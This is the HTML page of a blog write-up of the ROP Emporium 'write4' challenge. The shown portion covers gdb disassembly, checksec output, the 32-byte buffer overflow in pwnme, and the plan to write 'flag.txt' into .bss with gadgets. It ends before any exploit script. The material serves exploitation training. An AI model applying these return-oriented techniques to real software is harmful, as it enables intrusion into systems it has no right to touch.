<!DOCTYPE html><html lang="en" class="scroll-smooth"><head><link rel="apple-touch-icon" sizes="76x76" href="/static/favicons/apple-touch-icon.png"/><link rel="icon" type="image/png" sizes="32x32" href="/static/favicons/favicon-32x32.png"/><link rel="icon" type="image/png" sizes="16x16" href="/static/favicons/favicon-16x16.png"/><link rel="manifest" href="/static/favicons/site.webmanifest"/><link rel="mask-icon" href="/static/favicons/safari-pinned-tab.svg" color="#5bbad5"/><meta name="msapplication-TileColor" content="#000000"/><meta name="theme-color" content="#000000"/><link rel="alternate" type="application/rss+xml" href="/feed.xml"/><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.13.11/dist/katex.min.css" integrity="sha384-Um5gpz1odJg5Z4HAmzPtgZKdTBHZdw8S29IecapCSB31ligYPhHQZMIlWLYQGVoc" crossorigin="anonymous"/><meta charSet="utf-8"/><script>!function(){try {var d=document.documentElement.classList;d.remove('light','dark');var e=localStorage.getItem('theme');if("system"===e||(!e&&true)){var t="(prefers-color-scheme: dark)",m=window.matchMedia(t);m.media!==t||m.matches?d.add('dark'):d.add('light')}else if(e) d.add(e)}catch(e){}}()</script><meta content="width=device-width, initial-scale=1" name="viewport"/><title>Return-Oriented Programming - Write4</title><meta name="robots" content="follow, index"/><meta name="description" content="Find and manipulate gadgets to construct an arbitrary write primitive, then use it to learn where and how to get your data into process memory."/><meta property="og:url" content="https://thuri10.github.io/blog/ropemporium-write4"/><meta property="og:type" content="article"/><meta property="og:site_name" content="Solar Bits"/><meta property="og:description" content="Find and manipulate gadgets to construct an arbitrary write primitive, then use it to learn where and how to get your data into process memory."/><meta property="og:title" content="Return-Oriented Programming - Write4"/><meta property="og:image" content="https://thuri10.github.io"/><meta name="twitter:card" content="summary_large_image"/><meta name="twitter:site"/><meta name="twitter:title" content="Return-Oriented Programming - Write4"/><meta name="twitter:description" content="Find and manipulate gadgets to construct an arbitrary write primitive, then use it to learn where and how to get your data into process memory."/><meta name="twitter:image" content="https://thuri10.github.io"/><link rel="canonical" href="https://thuri10.github.io/blog/ropemporium-write4"/><meta property="article:published_time" content="2021-12-20T00:00:00.000Z"/><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "Article",
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://thuri10.github.io/blog/ropemporium-write4"
  },
  "headline": "Return-Oriented Programming - Write4",
  "image": [
    {
      "@type": "ImageObject",
      "url": "https://thuri10.github.io"
    }
  ],
  "datePublished": "2021-12-20T00:00:00.000Z",
  "dateModified": "2021-12-20T00:00:00.000Z",
  "author": [
    {
      "@type": "Person",
      "name": "Martin Muthuri"
    }
  ],
  "publisher": {
    "@type": "Organization",
    "name": "Thuri10",
    "logo": {
      "@type": "ImageObject",
      "url": "https://thuri10.github.io/static/images/logo.png"
    }
  },
  "description": "Find and manipulate gadgets to construct an arbitrary write primitive, then use it to learn where and how to get your data into process memory."
}</script><meta name="next-head-count" content="20"/><link rel="preload" href="/_next/static/css/6e10a27950d06492.css" as="style"/><link rel="stylesheet" href="/_next/static/css/6e10a27950d06492.css" data-n-g=""/><noscript data-n-css=""></noscript><script defer="" nomodule="" src="/_next/static/chunks/polyfills-5cd94c89d3acac5f.js"></script><script src="/_next/static/chunks/webpack-6b07d50b42459591.js" defer=""></script><script src="/_next/static/chunks/main-bc290367bb05fc37.js" defer=""></script><script src="/_next/static/chunks/pages/_app-ef9064f235cc759e.js" defer=""></script><script src="/_next/static/chunks/framework-327e104994690a53.js" defer=""></script><script src="/_next/static/chunks/675-74705f4ead346871.js" defer=""></script><script src="/_next/static/chunks/207-dd685ae53e609b20.js" defer=""></script><script src="/_next/static/chunks/620-3362006c15b294ef.js" defer=""></script><script src="/_next/static/chunks/pages/blog/%5B...slug%5D-27a5fa894d44d867.js" defer=""></script><script src="/_next/static/SFG1FnXcokiOY1XEoN9G7/_buildManifest.js" defer=""></script><script src="/_next/static/SFG1FnXcokiOY1XEoN9G7/_ssgManifest.js" defer=""></script><script src="/_next/static/SFG1FnXcokiOY1XEoN9G7/_middlewareManifest.js" defer=""></script></head><body class="bg-white text-black antialiased dark:bg-gray-900 dark:text-white"><div id="__next" data-reactroot=""><div class="mx-auto max-w-3xl px-4 sm:px-6 xl:max-w-5xl xl:px-0"><div class="flex h-screen flex-col justify-between"><header class="flex items-center justify-between py-10"><div><a aria-label="Solarbits" href="/"><div class="flex items-center justify-between"><div class="mr-3"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="344.564 330.278 111.737 91.218" width="53.87" height="43.61"><defs><linearGradient id="logo_svg__b" gradientUnits="userSpaceOnUse" x1="420.97" y1="331.28" x2="420.97" y2="418.5"><stop style="stop-color:#06b6d4;stop-opacity:1" offset="0%"></stop><stop style="stop-color:#67e8f9;stop-opacity:1" offset="100%"></stop></linearGradient><linearGradient id="logo_svg__d" gradientUnits="userSpaceOnUse" x1="377.89" y1="331.28" x2="377.89" y2="418.5"><stop style="stop-color:#06b6d4;stop-opacity:1" offset="0%"></stop><stop style="stop-color:#67e8f9;stop-opacity:1" offset="100%"></stop></linearGradient><path d="M453.3 331.28v28.57l-64.66 58.65v-30.08l64.66-57.14Z" id="logo_svg__a"></path><path d="M410.23 331.28v28.57l-64.67 58.65v-30.08l64.67-57.14Z" id="logo_svg__c"></path></defs><use xlink:href="#logo_svg__a" fill="url(#logo_svg__b)"></use><use xlink:href="#logo_svg__c" fill="url(#logo_svg__d)"></use></svg></div><div class="hidden h-6 text-2xl font-semibold sm:block">Solarbits</div></div></a></div><div class="flex items-center text-base leading-5"><div class="hidden sm:block"><a class="p-1 font-medium text-gray-900 dark:text-gray-100 sm:p-4" href="/blog">Blog</a><a class="p-1 font-medium text-gray-900 dark:text-gray-100 sm:p-4" href="/tags">Tags</a><a class="p-1 font-medium text-gray-900 dark:text-gray-100 sm:p-4" href="/projects">Projects</a><a class="p-1 font-medium text-gray-900 dark:text-gray-100 sm:p-4" href="/about">About</a></div><button aria-label="Toggle Dark Mode" type="button" class="ml-1 mr-1 h-8 w-8 rounded p-1 sm:ml-4"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" class="text-gray-900 dark:text-gray-100"><path d="M17.293 13.293A8 8 0 016.707 2.707a8.001 8.001 0 1010.586 10.586z"></path></svg></button><div class="sm:hidden"><button type="button" class="ml-1 mr-1 h-8 w-8 rounded py-1" aria-label="Toggle Menu"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" class="text-gray-900 dark:text-gray-100"><path fill-rule="evenodd" d="M3 5a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 10a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 15a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1z" clip-rule="evenodd"></path></svg></button><div class="fixed top-24 right-0 z-10 h-full w-full transform bg-gray-200 opacity-95 duration-300 ease-in-out dark:bg-gray-800 translate-x-full"><button type="button" aria-label="toggle modal" class="fixed h-full w-full cursor-auto focus:outline-none"></button><nav class="fixed mt-8 h-full"><div class="px-12 py-4"><a class="text-2xl font-bold tracking-widest text-gray-900 dark:text-gray-100" href="/blog">Blog</a></div><div class="px-12 py-4"><a class="text-2xl font-bold tracking-widest text-gray-900 dark:text-gray-100" href="/tags">Tags</a></div><div class="px-12 py-4"><a class="text-2xl font-bold tracking-widest text-gray-900 dark:text-gray-100" href="/projects">Projects</a></div><div class="px-12 py-4"><a class="text-2xl font-bold tracking-widest text-gray-900 dark:text-gray-100" href="/about">About</a></div></nav></div></div></div></header><main class="mb-auto"><div class="mx-auto max-w-3xl px-4 sm:px-6 xl:max-w-5xl xl:px-0"><div class="fixed right-8 bottom-8 hidden flex-col gap-3 md:flex"><button aria-label="Scroll To Comment" type="button" style="opacity:0" class="rounded-full bg-gray-200 p-2 text-gray-500 transition-all hover:bg-gray-300 dark:bg-gray-700 dark:text-gray-400 dark:hover:bg-gray-600"><svg class="h-5 w-5" viewBox="0 0 20 20" fill="currentColor"><path fill-rule="evenodd" d="M18 10c0 3.866-3.582 7-8 7a8.841 8.841 0 01-4.083-.98L2 17l1.338-3.123C2.493 12.767 2 11.434 2 10c0-3.866 3.582-7 8-7s8 3.134 8 7zM7 9H5v2h2V9zm8 0h-2v2h2V9zM9 9h2v2H9V9z" clip-rule="evenodd"></path></svg></button><button aria-label="Scroll To Top" type="button" style="opacity:0" class="rounded-full bg-gray-200 p-2 text-gray-500 transition-all hover:bg-gray-300 dark:bg-gray-700 dark:text-gray-400 dark:hover:bg-gray-600"><svg class="h-5 w-5" viewBox="0 0 20 20" fill="currentColor"><path fill-rule="evenodd" d="M3.293 9.707a1 1 0 010-1.414l6-6a1 1 0 011.414 0l6 6a1 1 0 01-1.414 1.414L11 5.414V17a1 1 0 11-2 0V5.414L4.707 9.707a1 1 0 01-1.414 0z" clip-rule="evenodd"></path></svg></button></div><article><div class="xl:divide-y xl:divide-gray-200 xl:dark:divide-gray-700"><header class="relative pt-6 xl:pb-6"><div class="space-y-1 text-center"><dl class="space-y-10"><div><dt class="sr-only">Published on</dt><div><h1 class="text-3xl font-extrabold leading-9 tracking-tight text-gray-900 dark:text-gray-100 sm:text-4xl sm:leading-10 md:text-5xl md:leading-14">Return-Oriented Programming - Write4</h1></div><dd class="flex items-center justify-center text-base font-medium leading-6 text-gray-500 dark:text-gray-400"><time dateTime="2021-12-20" class="flex items-center"><i class="twa  twa-calendar undefined"></i><span class="m1-1">Monday, December 20, 2021</span></time><span class="mx-2">-</span><div class="flex items-center"><i class="twa  twa-hourglass-not-done undefined"></i><span class="ml-1">11 mins read</span></div></dd></div></dl></div></header><div class="divide-y divide-gray-200 pb-8 dark:divide-gray-700 xl:grid xl:grid-cols-4 xl:gap-x-6 xl:divide-y-0" style="grid-template-rows:auto 1fr"><dl class="pt-6 pb-10 xl:border-b xl:border-gray-200 xl:pt-11 xl:dark:border-gray-700"><dt class="sr-only">Authors</dt><dd><ul class="flex justify-center space-x-8 sm:space-x-12 xl:block xl:space-x-0 xl:space-y-8"><li class="flex items-center space-x-2"><span style="box-sizing:border-box;display:inline-block;overflow:hidden;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;position:relative;max-width:100%"><span style="box-sizing:border-box;display:block;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;max-width:100%"><img style="display:block;max-width:100%;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0" alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%2738%27%20height=%2738%27/%3e"/></span><img alt="avatar" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="intrinsic" class="h-10 w-10 rounded-full" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%"/><noscript><img alt="avatar" src="/static/images/avatar.png" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%" class="h-10 w-10 rounded-full" loading="lazy"/></noscript></span><dl class="whitespace-nowrap text-sm font-medium leading-5"><dt class="sr-only">Name</dt><dd class="text-gray-900 dark:text-gray-100">Martin Muthuri</dd><dt class="sr-only">Twitter</dt><dd><a target="_blank" rel="noopener noreferrer" href="https://twitter.com/0xhexski" class="text-primary-500 hover:text-primary-600 dark:hover:text-primary-400">@0xhexski</a></dd></dl></li></ul></dd></dl><div class="divide-y divide-gray-200 dark:divide-gray-700 xl:col-span-3 xl:row-span-2 xl:pb-0"><div class="prose max-w-none pt-10 pb-8 dark:prose-dark"><h2 id="introduction"><a href="#introduction" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>Introduction</h2><p>Challenge Description</p><blockquote><p>Our first foray into proper gadget use. A useful function is still present, but we&#x27;ll need to write a string into memory somehow.</p></blockquote><p>The goal of this challenge is understanding how to abuse readable and writable memory regions in binary files.The target binary can be downloaded from the authors website <a target="_blank" rel="noopener noreferrer" href="https://ropemporium.com">ropemporium</a>.</p><p>First we check the binary protections enabled on the downloaded binary. Only <strong>NX</strong> (Not executable) is enabled on the binary according to checksec binary utility as shown in image below.</p><div class="relative"><pre><code class="code-highlight language-bash"><span class="code-line">    Arch:     amd64-64-little
</span><span class="code-line">    RELRO:    Partial RELRO
</span><span class="code-line">    Stack:    No canary found
</span><span class="code-line">    NX:       NX enabled
</span><span class="code-line">    PIE:      No PIE <span class="token punctuation">(</span>0x400000<span class="token punctuation">)</span>
</span></code></pre></div><p>For analysis of binary, we use gdb debugger to analyze the functions in the binary. We disassemble the main function which is the entry point of analysis.</p><div class="relative"><pre><code class="language-nasm code-highlight"><span class="code-line">(gdb) disas main
</span><span class="code-line">Dump of assembler code for function main:
</span><span class="code-line">   <span class="token number">0x0000000000400607</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">0</span><span class="token operator">&gt;</span>:	push   <span class="token register variable">rbp</span>
</span><span class="code-line">   <span class="token number">0x0000000000400608</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">1</span><span class="token operator">&gt;</span>:	mov    <span class="token register variable">rbp</span>,<span class="token register variable">rsp</span>
</span><span class="code-line">   <span class="token number">0x000000000040060b</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">4</span><span class="token operator">&gt;</span>:	call   <span class="token number">0x400500</span> <span class="token operator">&lt;</span>pwnme@plt<span class="token operator">&gt;</span>
</span><span class="code-line">   <span class="token number">0x0000000000400610</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">9</span><span class="token operator">&gt;</span>:	mov    <span class="token register variable">eax</span>,<span class="token number">0x0</span>
</span><span class="code-line">   <span class="token number">0x0000000000400615</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">14</span><span class="token operator">&gt;</span>:	pop    <span class="token register variable">rbp</span>
</span><span class="code-line">   <span class="token number">0x0000000000400616</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">15</span><span class="token operator">&gt;</span>:	ret    
</span><span class="code-line">End of assembler dump.
</span><span class="code-line">(gdb) 
</span></code></pre></div><p>From the above, the main function only calls pwnme function which looks interesting to us. Disassemble the <strong>pwnme</strong> function as shown below. pwnme@plt is used for referencing the pwnme real address. we disassemble the libwrite4 library as shown in the code below.</p><div class="relative"><pre><code class="language-nasm code-highlight"><span class="code-line"><span class="token function label">vx@archie:</span>write4<span class="token operator">$</span> gdb <span class="token operator">-</span>q libwrite4.so
</span><span class="code-line">Reading symbols from libwrite4.so...
</span><span class="code-line">(No debugging symbols found in libwrite4.so)
</span><span class="code-line">(gdb) disas pwnme 
</span><span class="code-line">Dump of assembler code for function pwnme:
</span><span class="code-line">   <span class="token number">0x00000000000008aa</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">0</span><span class="token operator">&gt;</span>:	push   <span class="token register variable">rbp</span>
</span><span class="code-line">   <span class="token number">0x00000000000008ab</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">1</span><span class="token operator">&gt;</span>:	mov    <span class="token register variable">rbp</span>,<span class="token register variable">rsp</span>
</span><span class="code-line">   <span class="token number">0x00000000000008ae</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">4</span><span class="token operator">&gt;</span>:	sub    <span class="token register variable">rsp</span>,<span class="token number">0x20</span>
</span><span class="code-line">   <span class="token number">0x00000000000008b2</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">8</span><span class="token operator">&gt;</span>:	mov    <span class="token register variable">rax</span>,QWORD PTR <span class="token operator">[</span>rip<span class="token operator">+</span><span class="token number">0x200727</span><span class="token operator">]</span>        # <span class="token number">0x200fe0</span>
</span><span class="code-line">   <span class="token number">0x00000000000008b9</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">15</span><span class="token operator">&gt;</span>:	mov    <span class="token register variable">rax</span>,QWORD PTR <span class="token operator">[</span><span class="token register variable">rax</span><span class="token operator">]</span>
</span><span class="code-line">   <span class="token number">0x00000000000008bc</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">18</span><span class="token operator">&gt;</span>:	mov    <span class="token register variable">ecx</span>,<span class="token number">0x0</span>
</span><span class="code-line">   <span class="token number">0x00000000000008c1</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">23</span><span class="token operator">&gt;</span>:	mov    <span class="token register variable">edx</span>,<span class="token number">0x2</span>
</span><span class="code-line">   <span class="token number">0x00000000000008c6</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">28</span><span class="token operator">&gt;</span>:	mov    <span class="token register variable">esi</span>,<span class="token number">0x0</span>
</span><span class="code-line">   <span class="token number">0x00000000000008cb</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">33</span><span class="token operator">&gt;</span>:	mov    <span class="token register variable">rdi</span>,<span class="token register variable">rax</span>
</span><span class="code-line">   <span class="token number">0x00000000000008ce</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">36</span><span class="token operator">&gt;</span>:	call   <span class="token number">0x790</span> <span class="token operator">&lt;</span>setvbuf@plt<span class="token operator">&gt;</span>
</span><span class="code-line">   <span class="token number">0x00000000000008d3</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">41</span><span class="token operator">&gt;</span>:	lea    <span class="token register variable">rdi</span>,<span class="token operator">[</span>rip<span class="token operator">+</span><span class="token number">0x106</span><span class="token operator">]</span>        # <span class="token number">0x9e0</span>
</span><span class="code-line">   <span class="token number">0x00000000000008da</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">48</span><span class="token operator">&gt;</span>:	call   <span class="token number">0x730</span> <span class="token operator">&lt;</span>puts@plt<span class="token operator">&gt;</span>
</span><span class="code-line">   <span class="token number">0x00000000000008df</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">53</span><span class="token operator">&gt;</span>:	lea    <span class="token register variable">rdi</span>,<span class="token operator">[</span>rip<span class="token operator">+</span><span class="token number">0x111</span><span class="token operator">]</span>        # <span class="token number">0x9f7</span>
</span><span class="code-line">   <span class="token number">0x00000000000008e6</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">60</span><span class="token operator">&gt;</span>:	call   <span class="token number">0x730</span> <span class="token operator">&lt;</span>puts@plt<span class="token operator">&gt;</span>
</span><span class="code-line">   <span class="token number">0x00000000000008eb</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">65</span><span class="token operator">&gt;</span>:	lea    <span class="token register variable">rax</span>,<span class="token operator">[</span><span class="token register variable">rbp</span><span class="token operator">-</span><span class="token number">0x20</span><span class="token operator">]</span>
</span><span class="code-line">   <span class="token number">0x00000000000008ef</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">69</span><span class="token operator">&gt;</span>:	mov    <span class="token register variable">edx</span>,<span class="token number">0x20</span>
</span><span class="code-line">   <span class="token number">0x00000000000008f4</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">74</span><span class="token operator">&gt;</span>:	mov    <span class="token register variable">esi</span>,<span class="token number">0x0</span>
</span><span class="code-line">   <span class="token number">0x00000000000008f9</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">79</span><span class="token operator">&gt;</span>:	mov    <span class="token register variable">rdi</span>,<span class="token register variable">rax</span>
</span><span class="code-line">   <span class="token number">0x00000000000008fc</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">82</span><span class="token operator">&gt;</span>:	call   <span class="token number">0x760</span> <span class="token operator">&lt;</span>memset@plt<span class="token operator">&gt;</span>
</span><span class="code-line">   <span class="token number">0x0000000000000901</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">87</span><span class="token operator">&gt;</span>:	lea    <span class="token register variable">rdi</span>,<span class="token operator">[</span>rip<span class="token operator">+</span><span class="token number">0xf8</span><span class="token operator">]</span>        # <span class="token number">0xa00</span>
</span><span class="code-line">   <span class="token number">0x0000000000000908</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">94</span><span class="token operator">&gt;</span>:	call   <span class="token number">0x730</span> <span class="token operator">&lt;</span>puts@plt<span class="token operator">&gt;</span>
</span><span class="code-line">   <span class="token number">0x000000000000090d</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">99</span><span class="token operator">&gt;</span>:	lea    <span class="token register variable">rdi</span>,<span class="token operator">[</span>rip<span class="token operator">+</span><span class="token number">0x115</span><span class="token operator">]</span>        # <span class="token number">0xa29</span>
</span><span class="code-line">   <span class="token number">0x0000000000000914</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">106</span><span class="token operator">&gt;</span>:	mov    <span class="token register variable">eax</span>,<span class="token number">0x0</span>
</span><span class="code-line">   <span class="token number">0x0000000000000919</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">111</span><span class="token operator">&gt;</span>:	call   <span class="token number">0x750</span> <span class="token operator">&lt;</span>printf@plt<span class="token operator">&gt;</span>
</span><span class="code-line">   <span class="token number">0x000000000000091e</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">116</span><span class="token operator">&gt;</span>:	lea    <span class="token register variable">rax</span>,<span class="token operator">[</span><span class="token register variable">rbp</span><span class="token operator">-</span><span class="token number">0x20</span><span class="token operator">]</span>
</span><span class="code-line">   <span class="token number">0x0000000000000922</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">120</span><span class="token operator">&gt;</span>:	mov    <span class="token register variable">edx</span>,<span class="token number">0x200</span>
</span><span class="code-line">   <span class="token number">0x0000000000000927</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">125</span><span class="token operator">&gt;</span>:	mov    <span class="token register variable">rsi</span>,<span class="token register variable">rax</span>
</span><span class="code-line">   <span class="token number">0x000000000000092a</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">128</span><span class="token operator">&gt;</span>:	mov    <span class="token register variable">edi</span>,<span class="token number">0x0</span>
</span><span class="code-line">   <span class="token number">0x000000000000092f</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">133</span><span class="token operator">&gt;</span>:	call   <span class="token number">0x770</span> <span class="token operator">&lt;</span>read@plt<span class="token operator">&gt;</span>
</span><span class="code-line">   <span class="token number">0x0000000000000934</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">138</span><span class="token operator">&gt;</span>:	lea    <span class="token register variable">rdi</span>,<span class="token operator">[</span>rip<span class="token operator">+</span><span class="token number">0xf1</span><span class="token operator">]</span>        # <span class="token number">0xa2c</span>
</span><span class="code-line">   <span class="token number">0x000000000000093b</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">145</span><span class="token operator">&gt;</span>:	call   <span class="token number">0x730</span> <span class="token operator">&lt;</span>puts@plt<span class="token operator">&gt;</span>
</span><span class="code-line">   <span class="token number">0x0000000000000940</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">150</span><span class="token operator">&gt;</span>:	nop
</span><span class="code-line">   <span class="token number">0x0000000000000941</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">151</span><span class="token operator">&gt;</span>:	leave  
</span><span class="code-line">   <span class="token number">0x0000000000000942</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">152</span><span class="token operator">&gt;</span>:	ret    
</span><span class="code-line">End of assembler dump.
</span><span class="code-line">(gdb) 
</span></code></pre></div><p>From the code above, we are filling a buffer of size 0x20(32bytes) with a constant byte of zero. memset function is used to overwrite any values that have the memory area specified. The memory we are overwriting is [rbp-0x20]. This means we are allocating a memory buffer of size 32 bytes from the address of base pointer in the stack.</p><div><span style="box-sizing:border-box;display:inline-block;overflow:hidden;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;position:relative;max-width:100%"><span style="box-sizing:border-box;display:block;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;max-width:100%"><img style="display:block;max-width:100%;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0" alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%27209%27%20height=%27256%27/%3e"/></span><img alt="" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%"/><noscript><img alt="" src="/static/images/ropemporium/stack.png" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%" loading="lazy"/></noscript></span></div><p>Therefore the next interesting function is <strong>read</strong> function, which reads for user input and stores in the specified buffer.From the above disassembled code, we are reading 0x200 bytes from the user input and storing it in our buffer. This means we are reading more than what the buffer can hold therefore leading to a stack buffer overflow.</p><div class="relative"><pre><code class="code-highlight language-c"><span class="code-line"><span class="token class-name">ssize_t</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token keyword">int</span> fd<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>buf<span class="token punctuation">,</span> <span class="token class-name">size_t</span> count<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// read(0,[rbp-0x20], 0x200)</span>
</span></code></pre></div><p>From the vulnerability,we can exploit it in order to abuse the control flow of the program through controlling the value of the return address.</p><p>From the authors hint , we need to look for an ELF section that is writable in order to write our string.</p><blockquote><p>Perhaps the most important thing to consider in this challenge is where we&#x27;re going to write our &quot;flag.txt&quot; string. Use rabin2 or readelf to check out the different sections of this binary and their permissions. Learn a little about ELF sections and their purpose. Opening the binary in radare2, we can check the permissions of different sections using the command <strong>iS</strong> as in the image above. ![]/static/images/ropemporium/write4_where.png)</p></blockquote><p>From the above we are able to determine the data and bss section is both readable and writable. Our target for the ropchain is to write our string to the <strong>bss</strong> section. Therefore we need to get memory address of <strong>.bss</strong> area.</p><p>From the authors challenge hint, we need to disassemble usefulFunction to understand how it works.</p><blockquote><p>Important! A PLT entry for a function named print_file() exists within the challenge binary, simply call it with the name of a file you wish to read (like &quot;flag.txt&quot;) as the 1st argument.</p></blockquote><p>From the disassembly of the binary, we have an interesting function called usefulFunction. The function is responsible for calling <strong>print_file</strong> function as hinted by the author.</p><div><span style="box-sizing:border-box;display:inline-block;overflow:hidden;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;position:relative;max-width:100%"><span style="box-sizing:border-box;display:block;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;max-width:100%"><img style="display:block;max-width:100%;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0" alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%27793%27%20height=%27182%27/%3e"/></span><img alt="" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%"/><noscript><img alt="" src="/static/images/ropemporium/write4_useful.png" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%" loading="lazy"/></noscript></span></div><p>From the analysis of the above function, we can determine we are passing a string file name called <strong>&quot;nonexistent&quot;</strong> to the print_file function. The content of the arguments passed to the print_file function will be printed out to the user. Our goal is to pass our string of interest <strong>flag.txt</strong> to the the print_file function.</p><p>From the disassembly of the binary we have another interesting function called <strong>usefulGadgets</strong>.</p><div class="relative"><pre><code class="language-nasm code-highlight"><span class="code-line">(gdb) disas usefulGadgets 
</span><span class="code-line">Dump of assembler code for function usefulGadgets:
</span><span class="code-line">   <span class="token number">0x0000000000400628</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">0</span><span class="token operator">&gt;</span>:	mov    QWORD PTR <span class="token operator">[</span><span class="token register variable">r14</span><span class="token operator">]</span>,<span class="token register variable">r15</span>
</span><span class="code-line">   <span class="token number">0x000000000040062b</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">3</span><span class="token operator">&gt;</span>:	ret    
</span><span class="code-line">   <span class="token number">0x000000000040062c</span> <span class="token operator">&lt;</span><span class="token operator">+</span><span class="token number">4</span><span class="token operator">&gt;</span>:	nop    DWORD PTR <span class="token operator">[</span><span class="token register variable">rax</span><span class="token operator">+</span><span class="token number">0x0</span><span class="token operator">]</span>
</span><span class="code-line">End of assembler dump.
</span><span class="code-line">(gdb) 
